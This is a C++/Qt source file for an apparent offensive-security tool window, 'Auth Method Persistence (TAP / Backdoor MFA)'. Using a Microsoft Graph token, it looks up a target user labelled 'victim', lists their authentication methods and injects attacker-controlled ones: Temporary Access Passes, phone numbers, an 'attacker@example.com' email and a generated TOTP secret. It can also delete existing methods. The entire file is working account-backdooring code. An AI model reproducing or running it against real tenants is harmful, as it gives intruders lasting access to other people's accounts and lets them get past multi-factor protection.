#include "AuthMethodPersistenceWindow.h"
#include "NetworkHelper.h"
#include "StyleManager.h"

#include <QApplication>
#include <QClipboard>
#include <QDateTime>
#include <QFormLayout>
#include <QGroupBox>
#include <QHBoxLayout>
#include <QHeaderView>
#include <QJsonDocument>
#include <QJsonObject>
#include <QLabel>
#include <QMessageBox>
#include <QRandomGenerator>
#include <QRegularExpression>

namespace {

// Map @odata.type -> {segment used in REST path, human label}.
// Segment is what goes after /authentication/ for GET/DELETE on the
// individual method (Graph endpoint naming isn't perfectly symmetric,
// so we map it explicitly).
struct MethodKind {
    QString odataType;
    QString pathSegment;
    QString label;
};

const QList<MethodKind> kMethodKinds = {
    { QStringLiteral("temporaryAccessPassAuthenticationMethod"),
      QStringLiteral("temporaryAccessPassMethods"),
      QStringLiteral("Temporary Access Pass") },
    { QStringLiteral("phoneAuthenticationMethod"),
      QStringLiteral("phoneMethods"),
      QStringLiteral("Phone") },
    { QStringLiteral("emailAuthenticationMethod"),
      QStringLiteral("emailMethods"),
      QStringLiteral("Alternative Email") },
    { QStringLiteral("softwareOathAuthenticationMethod"),
      QStringLiteral("softwareOathMethods"),
      QStringLiteral("Software OATH") },
    { QStringLiteral("fido2AuthenticationMethod"),
      QStringLiteral("fido2Methods"),
      QStringLiteral("FIDO2 (read/delete only)") },
    { QStringLiteral("microsoftAuthenticatorAuthenticationMethod"),
      QStringLiteral("microsoftAuthenticatorMethods"),
      QStringLiteral("MS Authenticator (read/delete only)") },
    { QStringLiteral("windowsHelloForBusinessAuthenticationMethod"),
      QStringLiteral("windowsHelloForBusinessMethods"),
      QStringLiteral("Windows Hello (read/delete only)") },
    { QStringLiteral("passwordAuthenticationMethod"),
      QStringLiteral("passwordMethods"),
      QStringLiteral("Password (read only)") },
};

QString labelForOdataType(const QString &odataType) {
    for (const auto &k : kMethodKinds)
        if (odataType.contains(k.odataType)) return k.label;
    return odataType;
}

QString segmentForOdataType(const QString &odataType) {
    for (const auto &k : kMethodKinds)
        if (odataType.contains(k.odataType)) return k.pathSegment;
    return QString();
}

// RFC 4648 base32 alphabet (used by TOTP secrets).
QString base32Encode(const QByteArray &data) {
    static const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    QString out;
    int buffer = 0, bitsLeft = 0;
    for (unsigned char c : data) {
        buffer = (buffer << 8) | c;
        bitsLeft += 8;
        while (bitsLeft >= 5) {
            bitsLeft -= 5;
            out.append(QLatin1Char(alphabet[(buffer >> bitsLeft) & 0x1F]));
        }
    }
    if (bitsLeft > 0) out.append(QLatin1Char(alphabet[(buffer << (5 - bitsLeft)) & 0x1F]));
    return out;
}

}  // namespace

AuthMethodPersistenceWindow::AuthMethodPersistenceWindow(QWidget *parent)
    : EnumerationWindowBase(parent)
{
    setWindowTitle("Auth Method Persistence (TAP / Backdoor MFA)");
    setupUi();
}

void AuthMethodPersistenceWindow::setupUi() {
    setupBaseUi("Microsoft Graph Token",
                "Paste access token for https://graph.microsoft.com",
                "Required permissions (delegated, admin-consented): "
                "UserAuthenticationMethod.ReadWrite.All. TAP mint also needs the caller to "
                "hold Authentication Administrator / Privileged Authentication Administrator "
                "role or equivalent.");

    // Target user row
    auto *targetGroup = new QGroupBox("Target User", this);
    auto *targetLayout = new QHBoxLayout(targetGroup);
    targetInput = new QLineEdit(this);
    targetInput->setPlaceholderText("victim@tenant.onmicrosoft.com   or   objectId GUID");
    resolveBtn = new QPushButton("Resolve && Load Methods", this);
    StyleManager::applyPrimaryStyle(resolveBtn);
    resolvedLabel = new QLabel("(no target resolved)", this);
    resolvedLabel->setStyleSheet("color:#888");
    targetLayout->addWidget(new QLabel("Target:", this));
    targetLayout->addWidget(targetInput, 1);
    targetLayout->addWidget(resolveBtn);
    targetLayout->addSpacing(12);
    targetLayout->addWidget(resolvedLabel, 1);
    mainLayout->addWidget(targetGroup);

    // Add-method group
    auto *addGroup = new QGroupBox("Add / Inject Method", this);
    auto *addOuter = new QVBoxLayout(addGroup);

    auto *typeRow = new QHBoxLayout();
    typeRow->addWidget(new QLabel("Method type:", this));
    methodTypeCombo = new QComboBox(this);
    methodTypeCombo->addItem("Temporary Access Pass (TAP)");
    methodTypeCombo->addItem("Phone (SMS / voice)");
    methodTypeCombo->addItem("Alternative Email");
    methodTypeCombo->addItem("Software OATH (TOTP)");
    typeRow->addWidget(methodTypeCombo, 1);
    addOuter->addLayout(typeRow);

    methodStack = new QStackedWidget(this);

    // -- TAP pane
    auto *tapPane = new QWidget(this);
    auto *tapForm = new QFormLayout(tapPane);
    tapLifetimeSpin = new QSpinBox(this);
    tapLifetimeSpin->setRange(10, 43200);  // 10 min .. 30 days per Graph docs
    tapLifetimeSpin->setValue(60);
    tapLifetimeSpin->setSuffix(" min");
    tapSingleUseCombo = new QComboBox(this);
    tapSingleUseCombo->addItem("Single-use (isUsableOnce = true)", true);
    tapSingleUseCombo->addItem("Reusable (isUsableOnce = false)", false);
    tapStartTime = new QDateTimeEdit(QDateTime::currentDateTimeUtc(), this);
    tapStartTime->setDisplayFormat("yyyy-MM-dd HH:mm 'UTC'");
    tapStartTime->setCalendarPopup(true);
    tapStartTime->setToolTip("Optional. Leave at 'now' to mint immediately.");
    lastTapCode = new QLineEdit(this);
    lastTapCode->setReadOnly(true);
    lastTapCode->setPlaceholderText("Passcode will appear here after mint");
    copyTapBtn = new QPushButton("Copy TAP", this);
    auto *tapCodeRow = new QHBoxLayout();
    tapCodeRow->addWidget(lastTapCode, 1);
    tapCodeRow->addWidget(copyTapBtn);
    tapForm->addRow("Lifetime:", tapLifetimeSpin);
    tapForm->addRow("Usage:",    tapSingleUseCombo);
    tapForm->addRow("Starts:",   tapStartTime);
    tapForm->addRow("Last TAP:", tapCodeRow);
    methodStack->addWidget(tapPane);

    // -- Phone pane
    auto *phonePane = new QWidget(this);
    auto *phoneForm = new QFormLayout(phonePane);
    phoneNumberInput = new QLineEdit(this);
    phoneNumberInput->setPlaceholderText("+1 5551234567  (E.164, leading + and country code)");
    phoneTypeCombo = new QComboBox(this);
    phoneTypeCombo->addItem("mobile");
    phoneTypeCombo->addItem("alternateMobile");
    phoneTypeCombo->addItem("office");
    phoneForm->addRow("Phone number:", phoneNumberInput);
    phoneForm->addRow("Phone type:",   phoneTypeCombo);
    methodStack->addWidget(phonePane);

    // -- Email pane
    auto *emailPane = new QWidget(this);
    auto *emailForm = new QFormLayout(emailPane);
    emailInput = new QLineEdit(this);
    emailInput->setPlaceholderText("attacker@example.com");
    emailForm->addRow("Alt email:", emailInput);
    methodStack->addWidget(emailPane);

    // -- Software OATH pane
    auto *oathPane = new QWidget(this);
    auto *oathForm = new QFormLayout(oathPane);
    oathSecretInput = new QLineEdit(this);
    oathSecretInput->setPlaceholderText("base32 secret (leave blank + click Generate)");
    oathGenBtn = new QPushButton("Generate", this);
    auto *oathRow = new QHBoxLayout();
    oathRow->addWidget(oathSecretInput, 1);
    oathRow->addWidget(oathGenBtn);
    oathLabelInput = new QLineEdit(this);
    oathLabelInput->setPlaceholderText("ANIMO-generated (shown in Authenticator)");
    oathForm->addRow("Secret (base32):", oathRow);
    oathForm->addRow("Label:",           oathLabelInput);
    methodStack->addWidget(oathPane);

    addOuter->addWidget(methodStack);

    auto *addActions = new QHBoxLayout();
    addBtn    = new QPushButton("Add Method", this);
    StyleManager::applySuccessStyle(addBtn);
    deleteBtn = new QPushButton("Delete Selected", this);
    StyleManager::applyDangerStyle(deleteBtn);
    loadBtn   = new QPushButton("Refresh Methods", this);
    addActions->addWidget(addBtn);
    addActions->addStretch();
    addActions->addWidget(loadBtn);
    addActions->addWidget(deleteBtn);
    addOuter->addLayout(addActions);
    mainLayout->addWidget(addGroup);

    // Current methods table
    auto *methodsGroup = new QGroupBox("Current Methods on Target", this);
    auto *methodsLayout = new QVBoxLayout(methodsGroup);
    methodsTable = new QTableWidget(this);
    methodsTable->setColumnCount(4);
    methodsTable->setHorizontalHeaderLabels({ "Type", "Detail", "Method ID", "REST segment" });
    methodsTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
    methodsTable->horizontalHeader()->setStretchLastSection(true);
    methodsTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    methodsTable->setSelectionMode(QAbstractItemView::SingleSelection);
    methodsTable->setAlternatingRowColors(true);
    methodsTable->setEditTriggers(QAbstractItemView::NoEditTriggers);
    methodsLayout->addWidget(methodsTable);
    mainLayout->addWidget(methodsGroup, 1);

    setupBottomUi();

    connect(resolveBtn,        &QPushButton::clicked, this, &AuthMethodPersistenceWindow::resolveTargetUser);
    connect(loadBtn,           &QPushButton::clicked, this, &AuthMethodPersistenceWindow::loadCurrentMethods);
    connect(addBtn,            &QPushButton::clicked, this, &AuthMethodPersistenceWindow::addMethod);
    connect(deleteBtn,         &QPushButton::clicked, this, &AuthMethodPersistenceWindow::deleteSelectedMethod);
    connect(oathGenBtn,        &QPushButton::clicked, this, &AuthMethodPersistenceWindow::generateOathSecret);
    connect(copyTapBtn,        &QPushButton::clicked, this, &AuthMethodPersistenceWindow::copyLastTapToClipboard);
    connect(methodTypeCombo,   QOverload<int>::of(&QComboBox::currentIndexChanged),
            this, &AuthMethodPersistenceWindow::onMethodTypeChanged);
    connect(targetInput,       &QLineEdit::returnPressed, this, &AuthMethodPersistenceWindow::resolveTargetUser);

    resize(1050, 780);
}

QList<QPushButton*> AuthMethodPersistenceWindow::getOperationButtons() {
    return { resolveBtn, loadBtn, addBtn, deleteBtn };
}

void AuthMethodPersistenceWindow::onCancelOperation() {}

void AuthMethodPersistenceWindow::onMethodTypeChanged(int index) {
    methodStack->setCurrentIndex(index);
}

void AuthMethodPersistenceWindow::setTargetUserId(const QString &id, const QString &upn) {
    resolvedUserId = id;
    resolvedUserUpn = upn;
    resolvedLabel->setText(QString("Resolved: %1  (id=%2)").arg(upn.isEmpty() ? "-" : upn, id));
    resolvedLabel->setStyleSheet("color:#8fd48f");
}

void AuthMethodPersistenceWindow::resolveTargetUser() {
    const QString token = getToken();
    if (!validateToken(token, "graph.microsoft.com")) return;

    const QString raw = targetInput->text().trimmed();
    if (raw.isEmpty()) {
        QMessageBox::warning(this, "Missing Target", "Enter a UPN or objectId.");
        return;
    }

    // Simple heuristic: 36-char with dashes -> already an objectId.
    static const QRegularExpression kGuid(
        "^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$");
    if (kGuid.match(raw).hasMatch()) {
        setTargetUserId(raw, QString());
        loadCurrentMethods();
        return;
    }

    setLoading(true);
    const QString url = QString("https://graph.microsoft.com/v1.0/users/%1?$select=id,userPrincipalName,displayName")
                            .arg(QString(QUrl::toPercentEncoding(raw)));
    QNetworkReply *reply = net->get(createBearerRequest(url, token));
    if (!reply) { logError("Failed to issue lookup"); setLoading(false); return; }
    trackReply(reply);
    connect(reply, &QNetworkReply::finished, this, [this, reply, raw]() {
        untrackReply(reply);
        reply->deleteLater();
        setLoading(false);
        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            logError(QString("Lookup failed for %1: %2").arg(raw, NetworkHelper::parseApiError(reply)));
            return;
        }
        const QJsonObject u = QJsonDocument::fromJson(reply->readAll()).object();
        setTargetUserId(u.value("id").toString(), u.value("userPrincipalName").toString());
        logSuccess(QString("Resolved target: %1").arg(resolvedUserUpn));
        loadCurrentMethods();
    });
}

void AuthMethodPersistenceWindow::loadCurrentMethods() {
    const QString token = getToken();
    if (!validateToken(token, "graph.microsoft.com")) return;
    if (resolvedUserId.isEmpty()) {
        QMessageBox::warning(this, "No Target", "Resolve a target user first.");
        return;
    }

    methodsTable->setRowCount(0);
    setLoading(true);
    const QString url = QString("https://graph.microsoft.com/v1.0/users/%1/authentication/methods")
                            .arg(resolvedUserId);
    QNetworkReply *reply = net->get(createBearerRequest(url, token));
    if (!reply) { logError("Failed to issue methods GET"); setLoading(false); return; }
    trackReply(reply);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        untrackReply(reply);
        reply->deleteLater();
        setLoading(false);
        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            logError(QString("Load methods failed: %1").arg(NetworkHelper::parseApiError(reply)));
            return;
        }
        const QJsonArray methods = QJsonDocument::fromJson(reply->readAll())
                                       .object().value("value").toArray();
        for (const QJsonValue &v : methods) appendMethodRow(v.toObject());
        logSuccess(QString("Loaded %1 method(s) for %2")
                       .arg(methods.size()).arg(resolvedUserUpn));
    });
}

void AuthMethodPersistenceWindow::appendMethodRow(const QJsonObject &method) {
    const QString odataType = method.value("@odata.type").toString();
    const QString typeLabel = labelForOdataType(odataType);
    const QString segment   = segmentForOdataType(odataType);
    const QString id        = method.value("id").toString();

    // Best-effort detail column (varies per method type)
    QString detail;
    if      (odataType.contains("phone"))                   detail = QString("%1 (%2)")
                                                                        .arg(method.value("phoneNumber").toString(),
                                                                             method.value("phoneType").toString());
    else if (odataType.contains("email"))                   detail = method.value("emailAddress").toString();
    else if (odataType.contains("microsoftAuthenticator"))  detail = method.value("displayName").toString();
    else if (odataType.contains("softwareOath"))            detail = method.value("displayName").toString();
    else if (odataType.contains("fido2"))                   detail = method.value("displayName").toString();
    else if (odataType.contains("temporaryAccessPass"))     detail = QString("isUsableOnce=%1 lifetime=%2m")
                                                                        .arg(method.value("isUsableOnce").toBool())
                                                                        .arg(method.value("lifetimeInMinutes").toInt());
    else if (odataType.contains("windowsHelloForBusiness")) detail = method.value("displayName").toString();

    const int row = methodsTable->rowCount();
    methodsTable->insertRow(row);
    methodsTable->setItem(row, 0, new QTableWidgetItem(typeLabel));
    methodsTable->setItem(row, 1, new QTableWidgetItem(detail));
    methodsTable->setItem(row, 2, new QTableWidgetItem(id));
    methodsTable->setItem(row, 3, new QTableWidgetItem(segment));
}

void AuthMethodPersistenceWindow::addMethod() {
    const QString token = getToken();
    if (!validateToken(token, "graph.microsoft.com")) return;
    if (resolvedUserId.isEmpty()) {
        QMessageBox::warning(this, "No Target", "Resolve a target user first.");
        return;
    }

    QString segment;
    QJsonObject body;
    switch (methodTypeCombo->currentIndex()) {
        case 0: {  // TAP
            segment = QStringLiteral("temporaryAccessPassMethods");
            body.insert("lifetimeInMinutes", tapLifetimeSpin->value());
            body.insert("isUsableOnce",      tapSingleUseCombo->currentData().toBool());
            // Only include startDateTime if the picker's set to a time other than "now".
            const QDateTime picked = tapStartTime->dateTime().toUTC();
            if (picked > QDateTime::currentDateTimeUtc().addSecs(60))
                body.insert("startDateTime", picked.toString(Qt::ISODateWithMs));
            break;
        }
        case 1: {  // Phone
            const QString num = phoneNumberInput->text().trimmed();
            if (num.isEmpty() || !num.startsWith('+')) {
                QMessageBox::warning(this, "Phone Number",
                                     "Number must be in E.164 form starting with +.");
                return;
            }
            segment = QStringLiteral("phoneMethods");
            body.insert("phoneNumber", num);
            body.insert("phoneType",   phoneTypeCombo->currentText());
            break;
        }
        case 2: {  // Email
            const QString addr = emailInput->text().trimmed();
            if (addr.isEmpty() || !addr.contains('@')) {
                QMessageBox::warning(this, "Email", "Enter a valid email address.");
                return;
            }
            segment = QStringLiteral("emailMethods");
            body.insert("emailAddress", addr);
            break;
        }
        case 3: {  // Software OATH
            QString secret = oathSecretInput->text().trimmed();
            if (secret.isEmpty()) {
                QMessageBox::warning(this, "OATH Secret",
                                     "Provide or generate a base32 secret first.");
                return;
            }
            segment = QStringLiteral("softwareOathMethods");
            body.insert("secretKey", secret);
            const QString label = oathLabelInput->text().trimmed();
            if (!label.isEmpty()) body.insert("displayName", label);
            break;
        }
    }

    const QString url = QString("https://graph.microsoft.com/v1.0/users/%1/authentication/%2")
                            .arg(resolvedUserId, segment);
    setLoading(true);
    QNetworkReply *reply = net->post(createBearerRequest(url, token),
                                     QJsonDocument(body).toJson(QJsonDocument::Compact));
    if (!reply) { logError("Failed to issue POST"); setLoading(false); return; }
    trackReply(reply);
    connect(reply, &QNetworkReply::finished, this, [this, reply, segment]() {
        untrackReply(reply);
        reply->deleteLater();
        setLoading(false);
        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            logError(QString("Add method failed: %1").arg(NetworkHelper::parseApiError(reply)));
            return;
        }
        const QJsonObject obj = QJsonDocument::fromJson(reply->readAll()).object();
        // TAP response includes the passcode as `temporaryAccessPass`.
        if (segment == QLatin1String("temporaryAccessPassMethods")) {
            const QString code = obj.value("temporaryAccessPass").toString();
            lastTapCode->setText(code);
            logSuccess(QString("TAP minted: %1  (id=%2)").arg(code, obj.value("id").toString()));
        } else {
            logSuccess(QString("Method added (id=%1)").arg(obj.value("id").toString()));
        }
        loadCurrentMethods();  // refresh the table
    });
}

void AuthMethodPersistenceWindow::deleteSelectedMethod() {
    const QString token = getToken();
    if (!validateToken(token, "graph.microsoft.com")) return;
    if (resolvedUserId.isEmpty()) {
        QMessageBox::warning(this, "No Target", "Resolve a target user first.");
        return;
    }
    const int row = methodsTable->currentRow();
    if (row < 0) {
        QMessageBox::warning(this, "No Selection", "Select a method row to delete.");
        return;
    }
    const QString methodId = methodsTable->item(row, 2)->text();
    const QString segment  = methodsTable->item(row, 3)->text();
    if (segment.isEmpty() || methodId.isEmpty()) {
        logError("Selected row has no method id / segment.");
        return;
    }
    if (segment == QLatin1String("passwordMethods")) {
        QMessageBox::warning(this, "Not Allowed",
                             "Password methods cannot be deleted via this endpoint.");
        return;
    }

    const auto btn = QMessageBox::question(
        this, "Confirm Delete",
        QString("Delete this method?\n\n  type:    %1\n  id:      %2\n  target:  %3")
            .arg(methodsTable->item(row, 0)->text(), methodId, resolvedUserUpn));
    if (btn != QMessageBox::Yes) return;

    const QString url = QString("https://graph.microsoft.com/v1.0/users/%1/authentication/%2/%3")
                            .arg(resolvedUserId, segment, methodId);
    setLoading(true);
    QNetworkReply *reply = net->deleteResource(createBearerRequest(url, token));
    if (!reply) { logError("Failed to issue DELETE"); setLoading(false); return; }
    trackReply(reply);
    connect(reply, &QNetworkReply::finished, this, [this, reply, methodId]() {
        untrackReply(reply);
        reply->deleteLater();
        setLoading(false);
        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            logError(QString("Delete failed: %1").arg(NetworkHelper::parseApiError(reply)));
            return;
        }
        logSuccess(QString("Deleted method id=%1").arg(methodId));
        loadCurrentMethods();
    });
}

void AuthMethodPersistenceWindow::generateOathSecret() {
    QByteArray buf(20, 0);
    for (int i = 0; i < buf.size(); ++i)
        buf[i] = char(QRandomGenerator::system()->bounded(0, 256));
    const QString b32 = base32Encode(buf);
    oathSecretInput->setText(b32);
    logInfo(QString("Generated 160-bit base32 OATH secret: %1").arg(b32));
}

void AuthMethodPersistenceWindow::copyLastTapToClipboard() {
    const QString code = lastTapCode->text();
    if (code.isEmpty()) return;
    QApplication::clipboard()->setText(code);
    logInfo("TAP passcode copied to clipboard.");
}
